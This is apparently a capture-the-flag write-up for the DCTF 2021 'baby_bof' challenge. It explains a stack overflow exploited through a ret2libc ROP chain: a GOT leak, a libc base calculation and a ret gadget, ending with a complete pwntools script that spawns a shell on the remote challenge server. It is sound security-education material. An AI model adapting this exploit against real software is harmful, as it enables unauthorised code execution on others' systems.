Preface  
-------

We got a simple binary with output ```plz don't rop me``` and after our input
```plz don't rop me```  
Also we got a Dockerfile, which showed us the used image was Ubuntu:20.04

Overview  
--------

Based on the output, we know it was a rop challenge.  
Also ```checksec baby_bof``` gave us.

```  
Arch:     amd64-64-little  
RELRO:    Partial RELRO  
Stack:    No canary found  
NX:       NX enabled  
PIE:      No PIE (0x400000)  
```

Loading the binary into *ghidra* I can calculate the offset of the return
address.

So I knew, that after writing 18 characters I could overwrite the return
address and control the code flow.

First I tried if I could do a rop only with the binary, but neither Ropper nor
RopGadget found enough gadgets.  
So I had to use libc. For this I first needed to get the address where libc
was loaded.

In order for this I leaked the address of _got.fgets_.  
If I then substract the address of fgets in libc, I could get the base address
of libc.  
After the leak I would rerun the vulnerable function to make our next input.

Then I could use _system_ and ```/bin/sh``` from libc to get a shell.

But somehow this did work on my local machine and not remote. Because I didn't
see my error, I gave up and continued with other challenges.  
Short before the end, I wanted to finish this challenge, so I gave it another
try.

I thought, that maybe my local system had a different libc.  
So I downloaded the [root](https://github.com/tianon/docker-brew-ubuntu-
core/blob/4b7cb6f04bc4054f9ab1fa42b549caa1a41b7c92/focal/ubuntu-focal-core-
cloudimg-amd64-root.tar.gz) from Github.  
From their I could extract the libc and loading them side by side showed me
the offsets were wrong.

But even with this change it didn't work.  
Because I thought it could still be some error with the offset, I tried to
print ```/bin/sh``` with puts.  
The printout was correctly and I successfully had a shell.

From their I could cat the flag and the challenge was solved.

I didn't understanding why it worked. Testing some bits showed, that their was
some call needed before the system or it woudln't work.  
I modified my script, to just include a ```ret-Gadget``` and my final exploit
code was.

```Python  
#!/usr/bin/env python3  
from pwn import *

context.arch = 'amd64'  
context.kernel = 'amd64'  
#context.log_level = "DEBUG"  
context.log_level = "INFO"

context.terminal = ['xfce4-terminal', '-x', 'sh', '-c']

vulnerable = './baby_bof'

elf = ELF(vulnerable)  
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')  
libc2 = ELF('./libc.so.6')

#p = elf.process()#  
p = remote("dctf-chall-baby-bof.westeurope.azurecontainer.io", 7481)

p.readuntil('plz don\'t rop me')

fgets_got = elf.symbols['got.fgets']  
fgets_libc = libc2.symbols['fgets']  
system_libc = libc2.symbols['system']  
sh_libc= next(libc2.search(b'/bin/sh'))  
ret = next(elf.search(asm('ret')))

rop = ROP(elf)  
rop.puts(fgets_got)  
rop.call(elf.symbols['vuln'])

p.sendline(b'\x41'*18 + bytes(rop))

p.recvuntil("i don't think this will work\n")

fgets_address = p.recvuntil("\n")[:-1]  
fgets_address = u64(fgets_address + b'\x00'*(8-len(fgets_address)))  
libc_address = (fgets_address - fgets_libc)  
system_address = system_libc + libc_address  
sh_address = sh_libc + libc_address  
elf.symbols['system'] = system_address

p.readuntil('plz don\'t rop me')

rop = ROP(elf)  
rop.system(sh_address)

p.sendline(b'\x41'*18 + p64(ret) + bytes(rop))

p.recvuntil("i don't think this will work\n")

p.interactive()  
```

The flag was located in a file called flag.txt.

```dctf{D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3}```

Original writeup (https://w0y.at/writeup/2021/05/17/dctf-2021-baby-bof.html).